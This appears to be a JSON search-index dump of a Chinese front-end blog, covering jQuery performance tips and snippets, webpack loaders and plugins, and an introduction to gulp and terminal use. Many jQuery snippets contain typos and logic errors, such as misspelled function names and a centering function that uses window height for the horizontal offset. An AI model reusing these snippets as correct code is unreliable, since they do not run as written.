$(&quot;[attribute=value]&quot;)\n    - 对这个利用属性定位`DOM`元素，本地`JavaScript`并没有直接实现。这种方式性能并不是很理想。建议避免使用。- ```  $(&quot;:hidden&quot;)\n\n  - 和上面利用属性定位`DOM`方式类似，建议尽量不要使用\n\n- 注意的地方\n\n  - 尽量使用`ID`选择器\n  - 尽量给选择器指定上下文\n\n\n缓存对象\n\n如果你需要在其他函数中使用jQuery对象，你可以把他们缓存在全局环境中\n\n\n数组方式使用jQuery对象\n\n使用jQuery选择器获取的结果是一个jQuery对象。在性能方面，建议使用for或while循环来处理，而不是$.each()\n\n\n事件代理\n\n每一个\nJavaScript\n\n事件（如：\nclick\n\n、\nmouseove\n\nr）都会冒泡到父级节点。当我们需要给多个元素调用同个函数时这点很有用。比如，我们要为一个表单绑定这样的行为：点击td后，把背景颜色设置为红色\n\n$(&quot;#myTable td&quot;).click(function()&#123;$(this).css(&quot;background&quot;,&quot;red&quot;);&#125;);\n\n假设有100个td元素，在使用以上的方式时，绑定了100个事件，将带来性能影响\n\n代替这种多元素的事件监听方法是，你只需向他们的父节点绑定一次事件，然后通过\nevent.target\n\n获取到点击的当前元素\n\n$(&quot;#myTable td&quot;).click(function(&#123;$(e.target).css(&quot;background&quot;,&quot;red&quot;)&#125;);\ne.target捕捉到触发的目标\n\n\n在\njQuery1.7\n\n中提供了一个新的方法\non()\n\n，来帮助你将整个事件监听封装到一个便利的方法中\n\n$(&quot;#myTable td&quot;).on(&quot;click&quot;,&#39;td&#39;,function()&#123;$(this).css(&quot;background&quot;,&quot;red&quot;);&#125;);\n\n\n\n\n\n\n将你的代码转化成jQuery插件\n\n它能够使你的代码有更好的重用性，并且能够有效的帮助你组织代码\n\n\n使用join()方法来拼接字符串\n\n也许你之前使用+来拼接字符串，现在可以改了。它确实有助于性能优化，尤其是长字符串处理的时候\n\n\n合理使用HTML5和Data属性\n\n&#96;&#96;&#96;HTML5的\ndata属性可以帮助我们插入数据，特别是后端的数据交换。\njQuery的\nData()方法有效利用\nHTML5      的属性      - 例如：``      - 为了读取数据，你需要使用如下代码        - `$(&quot;#dl&#x27;).data(&quot;role&#x27;;//page)`        - `$(&quot;#dl&#x27;).data(&quot;lastValue&#x27;;//43)`        - `$(&quot;#dl&#x27;).data(&quot;options&#x27;;//john)`  - **尽量使用原生的JavaScript方法**  - 压缩JavaScript代码    - 一方面使用`Gzip`；另一方面去除`JavaScript`文件里面的注释、空白#### 附录三 常用的jQuery代码片段------- 禁用页面的右键菜单\n\n\n\n$(document).ready(functuion(){    $(document).bind(“contextmenu”,function(e){        return false;  });});\n- 新窗口打开页面\n$(document).ready(function(){    &#x2F;&#x2F;例子1：href&#x3D;”http:&#x2F;&#x2F;“的链接将会在新窗口打开链接    $(‘a[href&#x3D;^&#x3D;”http:&#x2F;&#x2F;“]’).attr(“target”,”_blank”);\n  &#x2F;&#x2F;例子2：rel&#x3D;”external”的超链接将会在新窗口打开链接    $(“a[rel$&#x3D;’external’]”).click(function(){      this.target &#x3D; “_blank”;    });});&#x2F;&#x2F;useopen\n- 判断浏览器类型\n$(document).reday(function(){    &#x2F;&#x2F;Firefox2 and above    if( $.browser.mozilla &amp;&amp; $.browser.version&gt;&#x3D;”1.8”){      &#x2F;&#x2F;do something  }\n  &#x2F;&#x2F; Safari  if($.browser.safari){     &#x2F;&#x2F;do something  }\n  &#x2F;&#x2F; Chrome  if($.browser.chrome){     &#x2F;&#x2F;do something  }\n  &#x2F;&#x2F; Opera  if($.browser.opera){     &#x2F;&#x2F;do something  }\n})\n  &#x2F;&#x2F; IE6 and blow  if($.browser.msie &amp;&amp; $.browser.version&lt;&#x3D;6){     &#x2F;&#x2F;do something  }\n  &#x2F;&#x2F; anything above IE6  if($.browser.msie &amp;&amp; $.browser.version &gt; 6){     &#x2F;&#x2F;do something  }\n- 输入框文字获取和失去焦点\n$(document).ready(function(){    $(“input.text1”).val(“Enter you search text here”);    textFill($(‘input.text1’));});\nfunction textFill(input){&#x2F;&#x2F;input focus text function    var originvalue &#x3D; input.val();    input.focus(funtion(){        if($.trim(input.val())&#x3D;&#x3D; originvalue){            input.val(‘ ‘);        }  }).blur(function(){      if($.trim(input.val()) &#x3D;&#x3D; ‘ ‘){          input.val(originalvalue);      }  })}\n- 获取鼠标位置\n$(document).ready(function(){  $(document).mousemove(function(e){      $(“#XY”).html(“X:” + e.pageX+ “| Y” + e.pageY);  });});\n- 判断元素是否存在\n$(document).ready(function(){    if($(“#id”).length){      &#x2F;&#x2F; do some thing  }})\n- 点击div也可以跳转\n$(“div”).click(function(){    window.location  &#x3D; $(this).find(“a”).attr(“href”);})\n&#x2F;&#x2F;use\nhome\n- 设置div在屏幕中央\n$(document).ready(function(){\n    jQuery.fn.center = function(){\n        this.css(\"position\",\"absolute\");\n        this.css(\"top\",($(window).height() - this.lenght()) / 2 +$(window).scrollTop() + \"px\"); \n        this.css(\"left\",($(window).height() - this.lenght()) / 2 +$(window).scrollLeft() + \"px\"); \n      return this;\n  }\n//use \n\n $(“#XY”).center();});\n- 关闭所有动画效果\n$(document).ready(function(){    jQuery.fx.off &#x3D; true;});\n- 检测鼠标的右键和左键\n$(document).ready(function(){    $(“#xy”).mousedown(function(e){        alert(e.which);&#x2F;&#x2F;1 &#x3D; 鼠标左键  2&#x3D; 鼠标中间 3 &#x3D; 鼠标右键  });});\n- 回车提交表单\n$(document).ready(function(){    $(“input”).keyup(function(e){        if(e.which &#x3D;&#x3D; “13”){            alert(“回车提交”);      }  })});\n- 设置全局的Ajax参数\n$(“#load”).ajaxStart(function(){    showLoading();&#x2F;&#x2F;显示loading    disableButtons() &#x2F;&#x2F;禁用按钮}) $(“#load”).ajaxComplete(function(){    hideLoading();&#x2F;&#x2F;隐藏loading    enableButtons();&#x2F;&#x2F;启用按钮})\n- 获取选中的下拉框\n$(“#someElement”).find(‘option:selected’);$(“#someElement option:selected”);\n- 切换复选框\nvar tog &#x3D; false;$(“button”).click(function(){    $(“input[type&#x3D;checkbox]’).attr(“checked”,!tog);    tog &#x3D; !tog;});\n- 个性化链接\n$(document).ready(function(){     $(“a[href$&#x3D;’pdf’]”).addClass(“pdf”);     $(“a[href$&#x3D;’zip’]”).addClass(“zip”);     $(“a[href$&#x3D;’psd’]”).addClass(“psd”);});\n- 在一段时间后自动隐藏或关闭元素\nsetTimeOut(function(){        $(“div”).fadeIn(400);  },3000);\n&#x2F;&#x2F;而在1.4之后的版本可以用delay()来实现$(“div”).slideUp(300).delay(3000).fadeIn(400);\n- 使用事件代理绑定元素\n &#x2F;&#x2F;为table里面的td元素绑定click事件，不管td是一直存在还是动态创建的 &#x2F;&#x2F;jQuery 1.4.2之前使用这种方式 $(“table”).each(function(){    $(“td”,this).live(“click”,function(){       $(this).toggleClass(“hover”);    });});\n&#x2F;&#x2F;jquery 1.4.2使用的方式\n$(“table”).delegate(“td”,”click”,function(){    $(this).toggleClass(“hover”);});\n&#x2F;&#x2F;jQuery1.7.1使用的方式$(“table”).on(“click”,”td”,function(){    $(this).toggleClass(“hover”); })\n- 预加载图片\n(function($) {  var cache &#x3D; [];  &#x2F;&#x2F; Arguments are image paths relative to the current page.  $.preLoadImages &#x3D; function() {    var args_len &#x3D; arguments.length;    for (var i &#x3D; args_len; i–;) {      var cacheImage &#x3D; document.createElement(‘img’);      cacheImage.src &#x3D; arguments[i];      cache.push(cacheImage);    }  }jQuery.preLoadImages(“image1.gif”, “&#x2F;path&#x2F;to&#x2F;image2.png”);\n- 让页面中的每个元素都适合在移动设备上展示\nvar scr &#x3D; document.createElement(‘script’);scr.setAttribute(‘src’, ‘https://ajax.googleapis.com/ajax/libs/jquery/1.5.2/jquery.min.js&#39;);document.body.appendChild(scr);scr.onload &#x3D; function(){    $(‘div’).attr(‘class’, ‘’).attr(‘id’, ‘’).css({        ‘margin’ : 0,        ‘padding’ : 0,        ‘width’: ‘100%’,        ‘clear’:’both’    });};\n- 图像等比例缩放\n$(window).bind(“load”, function() {    &#x2F;&#x2F; IMAGE RESIZE    $(‘#product_cat_list img’).each(function() {        var maxWidth &#x3D; 120;        var maxHeight &#x3D; 120;        var ratio &#x3D; 0;        var width &#x3D; $(this).width();        var height &#x3D; $(this).height();        if(width &gt; maxWidth){            ratio &#x3D; maxWidth &#x2F; width;            $(this).css(“width”, maxWidth);            $(this).css(“height”, height * ratio);            height &#x3D; height * ratio;        }        var width &#x3D; $(this).width();        var height &#x3D; $(this).height();        if(height &gt; maxHeight){            ratio &#x3D; maxHeight &#x2F; height;            $(this).css(“height”, maxHeight);            $(this).css(“width”, width * ratio);            width &#x3D; width * ratio;        }    });    &#x2F;&#x2F;$(“#contentpage img”).show();    &#x2F;&#x2F; IMAGE RESIZE});\n- 返回页面顶部\n&#x2F;&#x2F; Back To Top$(document).ready(function(){  $(‘.top’).click(function() {     $(document).scrollTo(0,500);  });});&#x2F;&#x2F;Create a link defined with the class .topBack To Top\n- 使用jQuery打造手风琴式的折叠效果\nvar accordion &#x3D; {     init: function(){           var $container &#x3D; $(‘#accordion’);           $container.find(‘li:not(:first) .details’).hide();           $container.find(‘li:first’).addClass(‘active’);           $container.on(‘click’,’li a’,function(e){                  e.preventDefault();                  var $this &#x3D; $(this).parents(‘li’);                  if($this.hasClass(‘active’)){                         if($(‘.details’).is(‘:visible’)) {                                $this.find(‘.details’).slideUp();                         } else {                                $this.find(‘.details’).slideDown();                         }                  } else {                         $container.find(‘li.active .details’).slideUp();                         $container.find(‘li’).removeClass(‘active’);                         $this.addClass(‘active’);                         $this.find(‘.details’).slideDown();                  }           });     }};\n- 使用jQuery和Ajax自动填充选择框\n$(function(){$(“select#ctlJob”).change(function(){$.getJSON(“&#x2F;select.php”,{id: $(this).val(), ajax: ‘true’}, function(j){var options &#x3D; ‘’;for (var i &#x3D; 0; i &lt; j.length; i++) {options +&#x3D; ‘‘ + j[i].optionDisplay + ‘‘;}$(“select#ctlPerson”).html(options);})})})\n- 自动替换丢失的图片\n&#x2F;&#x2F; Safe Snippet$(“img”).error(function () {    $(this).unbind(“error”).attr(“src”, “missing_image.gif”);});&#x2F;&#x2F; Persistent Snipper$(“img”).error(function () {    $(this).attr(“src”, “missing_image.gif”);});\n- 预防对表单进行多次提交\n$(document).ready(function() {  $(‘form’).submit(function() {    if(typeof jQuery.data(this, “disabledOnSubmit”) &#x3D;&#x3D; ‘undefined’) {      jQuery.data(this, “disabledOnSubmit”, { submited: true });      $(‘input[type&#x3D;submit], input[type&#x3D;button]’, this).each(function() {        $(this).attr(“disabled”, “disabled”);      });      return true;    }    else    {      return false;    }  });});\n- 动态添加表单元素\n&#x2F;&#x2F;change event on password1 field to prompt new input$(‘#password1’).change(function() {        &#x2F;&#x2F;dynamically create new input and insert after password1        $(“#password1”).append(“”);});\n- 在窗口滚动时自动加载内容\nvar loading &#x3D; false;$(window).scroll(function(){    if((($(window).scrollTop()+$(window).height())+250)&gt;&#x3D;$(document).height()){        if(loading &#x3D;&#x3D; false){            loading &#x3D; true;            $(‘#loadingbar’).css(“display”,”block”);            $.get(“load.php?start&#x3D;”+$(‘#loaded_max’).val(), function(loaded){                $(‘body’).append(loaded);                $(‘#loaded_max’).val(parseInt($(‘#loaded_max’).val())+50);                $(‘#loadingbar’).css(“display”,”none”);                loading &#x3D; false;            });        }    }});$(document).ready(function() {    $(‘#loaded_max’).val(50);});\n- 导航菜单背景切换效果\n \n    导航一 \n    导航二 \n    导航三\n\n\n&#x2F;&#x2F;注意：代码需要修饰完善\n$(‘#nav’).click(function(e) { &#x2F;&#x2F; 要知道siblings的使用          \n$(e.target).addClass(‘tclass’).siblings(‘.tclass’).removeClass(‘tclass’);;\n });\n- 解决`jQuery`, `prototype`共存，`$`全局变量冲突问题\n\n\n jQuery.noConflict(); \n\n注意：一定要先引入prototype.js 再引入jquery.js，先后顺序不可错\n- jQuery 判断元素上是否绑定了事件\n&#x2F;&#x2F;jQuery event封装支持判断元素上是否绑定了事件，此方法只适用于jQuery绑定的事件var $events &#x3D; $(“#foo”).data(“events”);if( $events &amp;&amp; $events[“click”] ){　　    &#x2F;&#x2F;your code}\n- 如何正确地使用`toggleClass`\n&#x2F;&#x2F;切换（toggle）类允许你根据某个类的&#x2F;&#x2F;是否存在来添加或是删除该类。&#x2F;&#x2F;这种情况下有些开发者使用：a.hasClass(‘blueButton’) ? a.removeClass(‘blueButton’) : a.addClass(‘blueButton’);&#x2F;&#x2F;toggleClass允许你使用下面的语句来很容易地做到这一点a.toggleClass(‘blueButton’);\n- 如何设置IE特有的功能\nif ($.browser.msie) {    &#x2F;&#x2F; Internet Explorer就是个虐待狂}\n- 如何验证某个元素是否为空\n&#x2F;&#x2F; 方法一if (! $(‘#keks’).html()) {    &#x2F;&#x2F;什么都没有找到;}&#x2F;&#x2F; 方法二if ($(‘#keks’).is(“:empty”)) {    &#x2F;&#x2F;什么都没有找到;}\n- 访问IFrame里的元素\nvar iFrameDOM &#x3D; $(“iframe#someID”).contents();&#x2F;&#x2F;然后，就可以通过find方法来遍历获取iFrame中的元素了iFrameDOM.find(“.message”).slideUp();\n- 管理搜索框的值  - 现在各大网站都有搜索框，而搜索框通常都有默认值，当输入框获取焦点时，默认值消失。而一旦输入框失去焦点，而输入框里又没有输入新的值，输入框里的值又会恢复成默认值，如果往输入框里输入了新值，则输入框的值为新输入的值。这种特效用`JQuery`    很容易实现\n$(“#searchbox”) .focus(function(){      $(this).val(‘’)}) .blur(function(){     var $this &#x3D; $(this);    &#x2F;&#x2F; ‘请搜索…’为搜索框默认值    ($this.val() &#x3D;&#x3D;&#x3D; ‘’)? $this.val(‘请搜索…’) : null;});\n- 部分页面加载更新  - 为了提高`web`性能，有更新时我们通常不会加载整个页面，而只是仅仅更新部分页面内容，如图片的延迟加载等。页面部分刷新的特效在`JQuery`中也很容易实现\nsetInterval(function() {&#x2F;&#x2F;每隔5秒钟刷新页面内容 &#x2F;&#x2F;获取的内容将增加到 id为content的元素后 \n$(“#content”).load(url); }, 5000);\n- 采配置JQuery与其它库的兼容性  - 如果在项目中使用`JQuery`，`$` 是最常用的变量名，但`JQuery`并不是唯一一个使用`$`作为变量名的库，为了避免命名冲突，你可以按照下面方式来组织你的代码\n&#x2F;&#x2F;方法一： 为JQuery重新命名为 $jvar $j &#x3D; jQuery.noConflict();$j(‘#id’)…. &#x2F;&#x2F;\n方法二： 推荐使用的方式\n(function($){ $(document).ready(function(){     &#x2F;&#x2F;这儿，你可以正常的使用JQuery语法 });})(jQuery);\n- 测试密码的强度  - 在某些网站注册时常常会要求设置密码，网站也会根据输入密码的字符特点给出相应的提示，如密码过短、强度差、强度中等、强度强等。这又是怎么实现的呢？看下面代码：\n &#x2F;&#x2F;下面的正则表达式建议各位收藏哦，项目上有可能会用得着$(‘#pass’).keyup(function(e) { \n&#x2F;&#x2F;密码为八位及以上并且字母数字特殊字符三项都包括var strongRegex &#x3D; new RegExp(“^(?&#x3D;.{8,})(?&#x3D;.[A-Z])(?&#x3D;.[a-z])(?&#x3D;.*[0-9])(?&#x3D;.\\W).$”, “g”); \n&#x2F;&#x2F;密码为七位及以上并且字母、数字、特殊字符三项中有两项，强度是中等 var mediumRegex &#x3D; new RegExp(“^(?&#x3D;.{7,})(((?&#x3D;.[A-Z])(?&#x3D;.[a-z]))|((?&#x3D;.[A-Z])(?&#x3D;.[0-9]))|((?&#x3D;.[a-z])(?&#x3D;.[0-9]))).$”, “g”);var enoughRegex &#x3D; new RegExp(“(?&#x3D;.{6,}).“, “g”); \nif (false &#x3D;&#x3D; enoughRegex.test($(this).val())) { \n$(‘#passstrength’).html(‘More Characters’); } else if (strongRegex.test($(this).val())) {     $(‘#passstrength’).className &#x3D; ‘ok’;     $(‘#passstrength’).html(‘Strong!’); }else if (mediumRegex.test($(this).val())) {    $(‘#passstrength’).className &#x3D; ‘alert’;    $(‘#passstrength’).html(‘Medium!’); } else {    $(‘#passstrength’).className &#x3D; ‘error’;    $(‘#passstrength’).html(‘Weak!’);}return true;\n});\n#### 附录四 常见CND加速服务------- [Bootstrap中文网开源项目免费 CDN 服务](http://www.bootcdn.cn/)- [百度静态资源公共库](http://cdn.code.baidu.com/)- [360网站卫士常用前端公共库CDN服务–已停止服务](http://libs.useso.com/)- [开放静态文件 CDN](http://staticfile.org/)- [微软CDN服务](http://www.asp.net/ajax/cdn)- [阿里云](https://bbs.aliyun.com/read/139395.html)- [百度开放云平台](http://developer.baidu.com/wiki/index.php?title=docs/cplat/libs)- [jQuery CDN](http://code.jquery.com/)- [jQuery cdn加速](http://www.jq22.com/cdn/)- [新浪CDN](http://lib.sinaapp.com/)#### 附录五 jQuery的一些资源------- 速查手册  - [jQuery API 中文文档–css88](http://www.css88.com/jqapi-1.9/)  - [jQuery-overapi](http://overapi.com/jquery)  - [在线桌面版API](http://www.sxt.cn/searchsxt/sxtapipro/index.html)  - [更多详情—一份实用的API参考手册集合](https://github.com/poetries/mywiki/blob/master/bookmark/实用参考手册API.md)- ```  jQuery\n\n  插件\n\n基础常用\n滚动固定在某个位置\njQuery图片滚动插件全能版\njQuery Wookmark Load 瀑布流布局\njQuery Jcrop 图像裁剪\njQuery kxbdMarquee 无缝滚动\njQuery lightBox 灯箱效果\nLazy Load Plugin for jQuery\n\n\n更多插件-动效库整理\n插件动效库\n常用组件\n\n\n\n扩展阅读\n\njQuery源码分析系列\n\n","categories":["javascript"],"tags":["javascript"]},{"title":"webpack loader-plugin","url":"/2020/09/17/webpack/webpack%20loader-plugin/","content":"一、loader对于webpack，一切皆模块。webpack 只能理解 JavaScript 和 JSON 文件，其他类型&#x2F;后缀的文件都需要经过 loader 处理，将它们转换为js可识别的有效模块 (webpack 天生支持 ECMAScript、CommonJS、资源模块等模块类型)。loader可以做语言翻译(比如将文件从 TypeScript 转换为 JavaScript) 或格式转换(将内联图像转换为 data URL)还有样式编译(允许直接在 JavaScript 模块中 import CSS文件)。\n1.loader是什么？每个 loader 本质上都是一个导出为函数的 JavaScript 模块。loader runner 会调用此函数，将资源文件或者上一个 loader 产生的结果传进去，经过编译转换把处理结果再输出去（如果后面还有 loader 就传给下一个）。函数中的 this 作为上下文会被 webpack 填充，并且 loader runner 中包含一些实用的方法，比如可以使 loader 调用方式变为异步，或者获取 query 参数。简言之 loader 就是模块转换器。有点像 Vue 的过滤器。loader从下到上地取值(evaluate)&#x2F;执行(execute)，也就是是从后往前执行。\n2. 有哪些常见的Loader？他们是解决什么问题的？● source-map-loader：加载额外的 Source Map 文件，以方便断点调试● image-loader：加载并且压缩图片文件● eslint-loader：通过 ESLint 检查 JavaScript 代码\n文件url-loader 与 file-loader 类似，但当文件 size 小于设置的 limit 值，会返回 data URLfile-loader 将文件保存至输出文件夹中并返回 URL (默认是是绝对路径，可以 outputPath 和 publicPath 通过配置成相对路径)语法转换babel-loader 使用 Babel 加载 ES2015+ 代码并将其转换为 ES5ts-loader 像加载 JavaScript 一样加载 TypeScript 2.0+样式style-loader 将样式模块导出的内容以往  中注入多个  的形式，添加到 DOM 中css-loader 加载 CSS 文件并解析 @import 的 CSS 文件，将 url() 处理成 require() 请求，最终返回 CSS 代码less-loader 加载并编译 LESS 文件sass-loader 加载并编译 SASS&#x2F;SCSS 文件postcss-loader 使用 PostCSS 加载并转换 CSS&#x2F;SSS 文件stylus-loader 加载并编译 Stylus 文件框架vue-loader 加载并编译\n3. 在config文件配置在 module.rules 配置转换规则时，有两个必选属性 test 和 use。像这样 module: { rules: [{ test: &#x2F;.txt$&#x2F;, use: ‘raw-loader’ }] }会告诉 webpack 编译器(compiler) ，当碰到「在 require()&#x2F;import 语句中被解析为 ‘.txt’ 的路径」时，在你对它打包之前，先用 raw-loader 转换一下(预处理)。\nmodule.exports = &#123;  module: &#123;    rules: [      &#123;        test: /\\.vue$/,        use: [&#x27;a-loader&#x27;, &#x27;b-loader&#x27;, &#x27;c-loader&#x27;], // 从右到左，c-loader -&gt; b-loader -&gt; a-loader      &#125;,      &#123;        test: /\\.css$/, // test属性，规定哪些文件会被转换        use: [ // use属性，在进行转换时，应用哪些 loader          &#123; loader: &#x27;style-loader&#x27; &#125;,           &#123;            loader: &#x27;css-loader&#x27;,            options: &#123;              modules: true            &#125;          &#125;,          &#123; loader: &#x27;sass-loader&#x27; &#125;         ] // 从下到上，sass-loader -&gt; css-loader -&gt; style-loader      &#125;    ],  &#125;,&#125;\n\n4. loader 的执行顺序每个 Loader 的功能都应是单一而专注的，这样不仅便于维护，还能让它们在更多场景中被串联应用。因此 Loader 通常是组合使用的。链式调用一组 loader 时 (无论是模块规则配置还是内联方式)，它们会按照相反的顺序执行。即从右到左(或从下到上)，依次将前一个 loader 转换后的结果传递给下一个 loader。直到最后一个 loader 返回 webpack 所期望的 JavaScript。有点像 Promise 的 then。loader 可以用 String 或 Buffer 的形式传递它的处理结果，complier 会把它们在 loader 之间相互转换。最终结果也就是最后一个 loader 会返回一或两个值：第一个是代表模块的 JavaScript 源码的 String 或者 Buffer（这个结果会交给 webpack 的 require，因此一定是一段可执行的 node 模块的 JS 脚本[用字符串存储的]）；第二个是可选的 SourceMap (格式为 JSON 对象)。\n一组 loader 的执行有两个阶段：Pitching 阶段 和 Normal 阶段，类似于js中的事件捕获、冒泡。webpack 的 loader-runner 会按正序(从左到右) require 每个 loader，把这个 loader 的模块导出函数 和 pitch函数都存到 loaderContext 对象上，然后执行该 loader 的 pitch 方法（如果有的话）；如果一组 loader 的 pitch 都没有返回值，就开始 Normal阶段：反向(从右到左)执行 loader 的导出函数，依次进行模块源码的转换，直到拿到最后的处理结果；但是当 Pitching 阶段某个 loader 的 pitch 有返回值，那么就会跳过剩余未读取的 loader，直接进入执行 loader 的环节。从前一个 require 的 loader 开始执行，pitch 的返回值即是传入的第一个参数。除了 pitch 有返回的那个 loader，倒序执行已经 require 的每个 loader。原理可参考：浅析 webpack 打包流程(原理) 二 之【执行 loader 阶段，初始化模块 module，并用 loader 倒序转译】部分\nmodule: &#123;  rules: [&#123; test:/\\.vue$/, use: [&#x27;a-loader&#x27;, &#x27;b-loader&#x27;, &#x27;c-loader&#x27;] &#125;]&#125;,\n根据以上配置，*.vue文件在 loader 处理阶段将经历以下步骤：\n|- a-loader `pitch` 方法  |- b-loader `pitch` 方法    |- c-loader `pitch` 方法      |- 以模块依赖的形式即 import/require() 获取资源内容    |- c-loader normal 执行  |- b-loader normal 执行|- a-loader normal 执行\n|- a-loader normal 执行如果 b-loader 的 pitch 方法有返回值，直接跳过 c-loader 进入 loader 执行阶段，并且 b-loader 也不会执行。整个过程就会变成这样：\n|- a-loader `pitch` 方法  |- b-loader `pitch` 方法 (有返回结果，则跳过后面未 require 的 loader，直接进入 loader 执行阶段)|- a-loader normal 执行 (传入参数是 b-loader pitch 的返回值)\n图解loader：loader 可以利用 pitch 阶段来做什么？Pitch 方法是什么：每个 loader 可以挂载一个 pitch 函数，该函数主要用于利用 module 的 request 来提前做一些拦截处理的工作（后面会举例说明），并不实际处理模块内容。事实上很多 loader 并未定义 pitch，一般定义了 pitch 就是某些情况要返回东西。详情请看 Pitching Loader。\n当一组 loader 被链式调用，像上面的例子，正常情况只有最后一个c-loader能获得资源文件(起始 loader 只有一个入参：资源文件的内容)，b-loader拿到的是c-loader处理结果，中间如果再多几个 loader 也是如此，只能拿到上一个传来的值，处理好再传递给下一个。直到第一个a-loader返回最终结果。尽管 loaders 常被串联使用，但它们的功能仍旧是单一并独立的，且只关心自己的输入和输出。就像工厂流水线，一个区域的工人&#x2F;机器只干一种类型的活。所以合理搭配并配置正确的顺序才能得到我们想要的结果。\n它只想要 request 后面的 元数据(调用 loader时传入的第三个参数 metadata)。但有时候我们需要把两个用来做最后处理的 loader 串起来，比如 style-loader 和 css-loader。但 style-loader 并不需要 css-loader 的结果，它只需要 request 后的元数据。\n二、pluginplugin是什么？plugin是插件的意思，通常是用于对某个现有的架构进行扩展webpack中的plugin，就是对webpack现有功能的各种扩展，比如打包优化、文件压缩等等\nloader和plugin的区别loader主要用于加载&#x2F;转换某些类型的模块，它是一个加载&#x2F;转换器plugin是插件，它是对webpack本身的扩展，它是一个扩展器\nplugin的使用过程步骤一：通过npm安装需要使用的plugins（某些webpack已经内置的插件不需要安装）步骤二：在webpack.config.js中的plugins配置插件\n1.是什么Plugin（Plug-in）是一种计算机应用程序，它和主应用程序互相交互，以提供特定的功能\n是一种遵循一定规范的应用程序接口编写出来的程序，只能运行在程序规定的系统下，因为其需要调用原纯净系统提供的函数库或者数据\nwebpack中的plugin也是如此，plugin赋予其各种灵活的功能，例如打包优化、资源管理、环境变量注入等，它们会运行在 webpack 的不同阶段（钩子 &#x2F; 生命周期），贯穿了webpack整个编译周期\n关于整个编译生命周期钩子，有如下：\nentry-option ：初始化 optionruncompile：真正开始的编译，在创建 compilation 对象之前compilation ：生成好了 compilation 对象make 从 entry 开始递归分析依赖，准备对每个模块进行 buildafter-compile：编译 build 过程结束emit ：在将内存中 assets 内容写到磁盘文件夹之前after-emit ：在将内存中 assets 内容写到磁盘文件夹之后done：完成所有的编译过程failed：编译失败的时候\n\n2. 常见的Plugin\n3. 是否写过Loader和Plugin？描述一下编写loader或plugin的思路？Loader像一个”翻译官”把读到的源文件内容转义成新的文件内容，并且每个Loader通过链式操作，将源文件一步步翻译成想要的样子。编写Loader时要遵循单一原则，每个Loader只做一种”转义”工作。 每个Loader的拿到的是源文件内容（source），可以通过返回值的方式将处理后的内容输出，也可以调用this.callback()方法，将内容返回给webpack。 还可以通过 this.async()生成一个callback函数，再用这个callback将处理后的内容输出出去。 此外webpack还为开发者准备了开发loader的工具函数集——loader-utils。相对于Loader而言，Plugin的编写就灵活了许多。 webpack在运行的生命周期中会广播出许多事件，Plugin 可以监听这些事件，在合适的时机通过 Webpack 提供的 API 改变输出结果。\n4. Loader和Plugin的不同？不同的作用● Loader直译为”加载器”。Webpack将一切文件视为模块，但是webpack原生是只能解析js文件，如果想将其他文件也打包的话，就会用到loader。 所以Loader的作用是让webpack拥有了加载和解析非JavaScript文件的能力。● Plugin直译为”插件”。Plugin可以扩展webpack的功能，让webpack具有更多的灵活性。 在 Webpack 运行的生命周期中会广播出许多事件，Plugin 可以监听这些事件，在合适的时机通过 Webpack 提供的 API 改变输出结果。不同的用法\n\nLoader在module.rules中配置，也就是说他作为模块的解析规则而存在。 类型为数组，每一项都是一个Object，里面描述了对于什么类型的文件（test），使用什么加载(loader)和使用的参数（options）\nPlugin在plugins中单独配置。 类型为数组，每一项是一个plugin的实例，参数都通过构造函数传入。\n\n","categories":["前端工程化"],"tags":["webpack"]},{"title":"glup总结","url":"/2020/09/11/webpack/glup%E6%80%BB%E7%BB%93/","content":"一、gulp 入门简介\ngulp 是基于 node 实现Web 前端自动化开发的工具，利用它能够极大的提高开发效率。\n在 Web 前端开发工作中有很多“重复工作”，比如压缩CSS/JS文件。而这些工作都是有规律的。找到这些规律，并编写 gulp 配置代码,让 gulp 自动执行这些“重复工作”。\n\n将规律转换为 gulp 代码\n\n现有目录结构如下：\n\n\n└── js/    └── a.js\n\n1.1 规律\n\n找到 js/目录下的所有 .js 文件\n压缩这些 js 文件\n将压缩后的代码另存在 dist/js/ 目录下\n\n1.2 编写 gulp 代码\n// 压缩 JavaScript 文件gulp.task(&#x27;script&#x27;, function() &#123;    // 1. 找到    gulp.src(&#x27;js/*.js&#x27;)    // 2. 压缩        .pipe(uglify())    // 3. 另存        .pipe(gulp.dest(&#x27;dist/js&#x27;));&#125;);\n\n1.3 代码执行结果\n代码执行后文件结构\n└── js/│   └── a.js└── dist/    └── js/        └── a.js\n\na.js 压缩前\nfunction demo (msg) &#123;    alert(&#x27;--------\\r\\n&#x27; + msg + &#x27;\\r\\n--------&#x27;)&#125;demo(&#x27;Hi&#x27;)\n\n\n\na.js 压缩后\nfunction demo(n)&#123;alert(&quot;--------\\r\\n&quot;+n+&quot;\\r\\n--------&quot;)&#125;demo(&quot;Hi&quot;);\n\n\n\n此时 dist/js 目录下的 .js 文件都是压缩后的版本。\n你还可以监控 js/ 目录下的 js 文件，当某个文件被修改时，自动压缩修改文件。启动 gulp 后就可以让它帮助你自动构建 Web 项目。\n\ngulp 还可以做很多事，例如：\n\n压缩CSS\n压缩图片\n编译Sass/LESS\n编译CoffeeScript\nmarkdown转换为 html\n\n二、安装 Node 和 gulp\ngulp 是基于 node 实现的，那么我们就需要先安装 node。\n\nNode 是一个基于Chrome JavaScript V8引擎建立的一个平台，可以利用它实现 Web服务，做类似PHP的事。\n\n打开 https://nodejs.org/ 点击绿色的 INSTALL 按钮下载安装 node。\n2.1 命令行\n在 Windows 中可按 徽标键（alt键左边）+ R 打开输入 cmd + Enter 打开命令行。\n2.2 终端(Mac)\n打开 Launchpad（像火箭一样的图标），在屏幕上方搜索框中输入 终端 + Enter 打开终端。\n2.3 查看 node 版本号\n在终端&#x2F;命令行中输入 node -v 检测node是否安装成功，安装成功会显示出node 的版本号。\n2.4 跳转目录\n终端&#x2F;命令行 中可使用 cd 目录名 跳转至指定目录，Mac 中还可以使用 ls 查看当前目录下的文件列表。\n2.5 Windows\nWindows 下可使用如下命令跳转至指定目录：\n// 跳转至 C 盘根目录cd c:\\// 跳转至当前目录的 demo 文件夹cd demo// 跳转至上一级cd ..\n\n2.6 Mac\nMac中建议只在 Documents目录下进行文件操作。\n// 跳转至文档目录cd /Users/你的用户名/Documents/// 或第一次打开终端时直接输入cd Documents// 查看目录下文件列表ls// 创建文件夹mkdir demo// 跳转至当前目录下的 demo 文件夹cd demo// 跳转至上级目录cd ..\n\n2.7 退出运行状态\n如果你在命令行中启动了一些一直运行的命令，你的命令行会进入“运行”状态，此时你不可以在命令行进行其他操作。可通过 Ctrl + C 停止 gulp。（Mac 中使用 control + C）\n后面的章节中如果代码中存在 gulp.watch 